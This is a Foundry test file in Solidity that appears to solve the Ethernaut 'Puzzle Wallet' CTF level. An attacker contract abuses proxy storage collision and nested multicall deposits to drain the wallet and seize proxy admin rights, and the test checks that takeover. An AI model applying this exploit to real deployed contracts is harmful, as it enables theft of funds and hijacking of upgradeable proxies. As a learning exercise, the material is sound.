// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract Attaker {
    address private immutable proxy;
    address private immutable owner;
    address private immutable wallet;

    constructor(address _proxy, address _wallet) {
        owner = msg.sender;
        proxy = _proxy;
        wallet = _wallet;
    }

    fallback() external payable {
        console.log("Attaker_fallback");
    }

    receive() external payable {
        console.log("Attaker_receive");
    }

    function attack() public {
        require(msg.sender == owner, "Not the owner");

        (bool successProposeAdmin,) = proxy.call(abi.encodeWithSignature("proposeNewAdmin(address)", address(this)));
        require(successProposeAdmin, "Propose new admin failed");

        (bool successAddToWhitelist,) =
            proxy.call(abi.encodeWithSelector(PuzzleWallet.addToWhitelist.selector, address(this)));
        require(successAddToWhitelist, "Add to whitelist failed");

        bytes[] memory interDallData = new bytes[](1);
        interDallData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory callData = new bytes[](2);
        callData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        callData[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, interDallData);

        (bool successMulticall,) =
            proxy.call{value: 1e18}(abi.encodeWithSelector(PuzzleWallet.multicall.selector, callData));
        require(successMulticall, "Multicall failed");

        (bool successExecute,) =
            proxy.call(abi.encodeWithSelector(PuzzleWallet.execute.selector, address(this), 2e18, ""));
        require(successExecute, "Execute failed");

        PuzzleWallet(proxy).setMaxBalance(uint256(uint160(address(this))));
    }
}

contract PuzzleWalletTest is Test {
    PuzzleWallet wallet;
    PuzzleProxy proxy;
    Attaker attaker;
    address private ADMIN = makeAddr("Admin");
    uint256 private constant MAX_BALANCE = 1_000_000e18;

    function setUp() public {
        wallet = new PuzzleWallet();

        bytes memory data = abi.encodeWithSignature("init(uint256)", 10 ether);
        proxy = new PuzzleProxy(ADMIN, address(wallet), data);
        attaker = new Attaker(address(proxy), address(wallet));

        vm.deal(address(proxy), 1e18);
        vm.deal(address(attaker), 1e18);
    }

    function testAttack() public {
        //logAddress();
        attaker.attack();
        address newProxyAdmin = proxy.admin();
        assertEq(newProxyAdmin, address(attaker), "Admin address is not the attaker");
    }

    function logAddress() public {
        console.log("--------------------------------");
        console.log("wallet", address(wallet));
        console.log("proxy", address(proxy));
        console.log("attaker", address(attaker));
        console.log("ADMIN", ADMIN);
        console.log("THIS", address(this));
        console.log("--------------------------------");
    }
}
